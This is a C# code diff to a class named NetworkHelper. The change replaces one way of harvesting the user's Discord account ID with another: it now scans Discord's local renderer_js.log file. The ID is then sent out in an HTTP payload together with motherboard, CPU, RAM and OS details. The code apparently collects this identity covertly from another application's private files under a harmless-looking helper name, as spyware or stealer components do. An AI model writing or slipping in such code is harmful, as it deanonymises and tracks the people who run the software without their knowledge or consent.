@@ -356,21 +356,24 @@ public static class NetworkHelper
         string osVersion = $"{build}.{ubr}";
 
         string discordId = "Failed to get Discord account id";
-        string discordUsername = "Failed to get Discord username";
 
-        string discordJsonPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "sentry", "scope_v3.json");
-        if (File.Exists(discordJsonPath))
+        string discordLogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "logs", "renderer_js.log");
+        if (File.Exists(discordLogPath))
         {
             try
             {
-                string jsonText = File.ReadAllText(discordJsonPath);
-                using JsonDocument doc = JsonDocument.Parse(jsonText);
-
-                if (doc.RootElement.TryGetProperty("scope", out var scope) &&
-                    scope.TryGetProperty("user", out var user))
+                foreach (string line in File.ReadLines(discordLogPath))
                 {
-                    discordId = user.GetProperty("id").GetString() ?? discordId;
-                    discordUsername = user.GetProperty("username").GetString() ?? discordUsername;
+                    if (line.Contains("[DatabaseManager] removing database (user: "))
+                    {
+                        int startIndex = line.IndexOf("user: ") + 6;
+                        int endIndex = line.IndexOf(",", startIndex);
+                        if (startIndex != -1 && endIndex != -1)
+                        {
+                            discordId = line.Substring(startIndex, endIndex - startIndex);
+                            break;
+                        }
+                    }
                 }
             }
             catch
@@ -383,7 +386,6 @@ public static class NetworkHelper
         {
             { new StringContent(
                 $"<@{discordId}>\n" +
-                $"{discordUsername}\n" +
                 $"{motherboard}\n" +
                 $"{cpuName}\n" +
                 $"{ram}\n" +
